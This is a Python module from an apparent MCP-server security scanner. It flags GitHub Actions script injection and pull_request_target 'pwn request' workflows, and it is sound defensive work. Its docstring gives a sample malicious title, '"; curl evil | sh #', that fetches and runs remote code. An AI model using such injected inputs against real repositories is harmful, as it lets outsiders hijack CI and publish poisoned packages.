"""GitHub Actions workflows that let an outsider run code in the project's CI — listed evidence.

A server's own CI usually holds the token that publishes it to npm or PyPI, so
a workflow an outsider can steer is a path to a malicious release of the
server users install. Two shapes, both well documented and both decidable from
the workflow file alone:

- **Script injection** — a `run:` script (or `actions/github-script`'s
  `script:`) that interpolates event text an outsider writes: an issue or pull
  request title or body, a comment, a commit message, a branch name. `${{ }}`
  is substituted into the script BEFORE the shell parses it, so a title like
  `"; curl evil | sh #` is code.
- **pwn request** — a `pull_request_target` workflow (which runs with the
  base repository's secrets) that checks out the pull request's own head and
  so runs the outsider's code with them.

Each is LISTED, never deducted (`CodeFinding.listed`): its precision on real
repositories has not been measured. Workflow files are attacker input; they are
read through `inventory.read_manifest` (bounded, whole or not at all), and the
YAML walk is bounded because PyYAML aliases can make a small file expand
exponentially when traversed.
"""

from __future__ import annotations

import re
from collections.abc import Iterator
from pathlib import Path, PurePosixPath
from typing import TYPE_CHECKING, Any

import yaml

from mcpwatchman.workers.scanner.inventory import Inventory, Role, read_manifest
from mcpwatchman.workers.scoring.composite import Confidence, Severity

if TYPE_CHECKING:
    from mcpwatchman.workers.scanner.semgrep_check import CodeFinding

INJECTION_RULE = "mcp-ci-workflow-script-injection"
PWN_REQUEST_RULE = "mcp-ci-pull-request-target-checkout"

MAX_WORKFLOWS = 100
MAX_NODES = 50_000

# Event fields an outsider controls. github.event.pull_request.head.sha is not
# here: a SHA cannot carry a payload.
_UNTRUSTED = re.compile(
    r"\$\{\{[^}]*?("
    r"github\.event\.(issue|pull_request|comment|review|review_comment|discussion"
    r"|discussion_comment|head_commit|commits|pages|workflow_run)\b[^}]*?"
    r"\b(title|body|message|name|email|ref|label|page_name|head_branch)\b"
    r"|github\.head_ref"
    r")[^}]*\}\}"
)
_HEAD_REF = re.compile(
    r"github\.event\.pull_request\.head\.(ref|sha)|github\.head_ref|refs/pull/"
)

INJECTION_MESSAGE = (
    "A workflow script interpolates text an outsider can write ({expr}). "
    "GitHub substitutes ${{{{ }}}} into the script before the shell runs it, so "
    "a crafted issue, pull request or branch name becomes code running in this "
    "project's CI — which commonly holds the token that publishes the package."
)
PWN_MESSAGE = (
    "A pull_request_target workflow checks out the pull request's own code. "
    "pull_request_target runs with this repository's secrets, so checking out "
    "and running a contributor's head gives code from any fork those secrets."
)


class _Budget(Exception):
    pass


def _walk(node: Any, budget: list[int], seen: set[int]) -> Iterator[Any]:
    if id(node) in seen:
        return
    seen.add(id(node))
    budget[0] -= 1
    if budget[0] < 0:
        raise _Budget
    yield node
    children = node.values() if isinstance(node, dict) else node if isinstance(node, list) else ()
    for child in children:
        yield from _walk(child, budget, seen)


def _line_of(text: str, needle: str) -> int:
    for n, line in enumerate(text.splitlines(), 1):
        if needle in line:
            return n
    return 0


_KEY = re.compile(r"^\s*(?:-\s*)?([\w.-]+)\s*:")


def _script_line(text: str, needle: str) -> int:
    """The line where `needle` sits in a script — not its first mention, which
    may be a `ref:` or an `if:` holding the same expression harmlessly."""
    first = 0
    for n, line in enumerate(text.splitlines(), 1):
        if needle not in line:
            continue
        first = first or n
        key = _KEY.match(line)
        if key is None or key.group(1) in ("run", "script"):
            return n
    return first


def _triggers(doc: dict[Any, Any]) -> set[str]:
    # PyYAML reads a bare `on:` key as the boolean True.
    on = doc.get("on", doc.get(True))
    if isinstance(on, str):
        return {on}
    if isinstance(on, list):
        return {t for t in on if isinstance(t, str)}
    if isinstance(on, dict):
        return {t for t in on if isinstance(t, str)}
    return set()


def workflow_findings(root: Path, inventory: Inventory) -> list[CodeFinding]:
    from mcpwatchman.workers.scanner.semgrep_check import CodeFinding  # noqa: F811 - runtime import

    # Only the ROOT .github/workflows runs. A copy nested deeper (a vendored
    # project under docs/, say) is text, not CI — measured: one published
    # server's only hit was docs/autogpt_research/.github/workflows/.
    workflows = [
        f for f in inventory.files
        if PurePosixPath(f.path).parent.as_posix() == ".github/workflows"
        and PurePosixPath(f.path).suffix in (".yml", ".yaml")
    ]
    out: list[CodeFinding] = []
    for record in workflows[:MAX_WORKFLOWS]:
        text = read_manifest(root, record.path)
        if not text:
            continue
        try:
            doc = yaml.safe_load(text)
        except (yaml.YAMLError, RecursionError, ValueError):
            continue
        if not isinstance(doc, dict):
            continue

        def finding(rule: str, message: str, line: int, *, cwe: str, pattern: str,
                    record: Any = record, text: str = text) -> CodeFinding:
            excerpt = text.splitlines()[line - 1].strip() if line else ""
            return CodeFinding(
                rule_id=rule, severity=Severity.MEDIUM, confidence=Confidence.LOW,
                message=message, path=record.path, line=line, excerpt=excerpt[:300],
                mcp_pattern=pattern, cwe=cwe, in_test=record.role is Role.TEST, listed=True,
            )

        seen_lines: set[tuple[str, int]] = set()
        try:
            nodes = list(_walk(doc, [MAX_NODES], set()))
        except _Budget:
            continue
        for node in nodes:
            if not isinstance(node, dict):
                continue
            scripts = [node.get("run")]
            with_ = node.get("with")
            if isinstance(node.get("uses"), str) and "github-script" in node["uses"] \
                    and isinstance(with_, dict):
                scripts.append(with_.get("script"))
            for script in scripts:
                if not isinstance(script, str):
                    continue
                for match in _UNTRUSTED.finditer(script):
                    expr = match.group(0)
                    line = _script_line(text, expr)
                    if (INJECTION_RULE, line) in seen_lines:
                        continue
                    seen_lines.add((INJECTION_RULE, line))
                    out.append(finding(INJECTION_RULE, INJECTION_MESSAGE.format(expr=expr), line,
                                       cwe="CWE-94", pattern="ci-script-injection"))
        if "pull_request_target" in _triggers(doc):
            for node in nodes:
                if not (isinstance(node, dict) and isinstance(node.get("uses"), str)
                        and node["uses"].startswith("actions/checkout")):
                    continue
                with_ = node.get("with")
                ref = with_.get("ref") if isinstance(with_, dict) else None
                if isinstance(ref, str) and _HEAD_REF.search(ref):
                    line = _line_of(text, ref)
                    out.append(finding(PWN_REQUEST_RULE, PWN_MESSAGE, line,
                                       cwe="CWE-829", pattern="ci-pwn-request"))
    return out


__all__ = ["INJECTION_RULE", "PWN_REQUEST_RULE", "workflow_findings"]
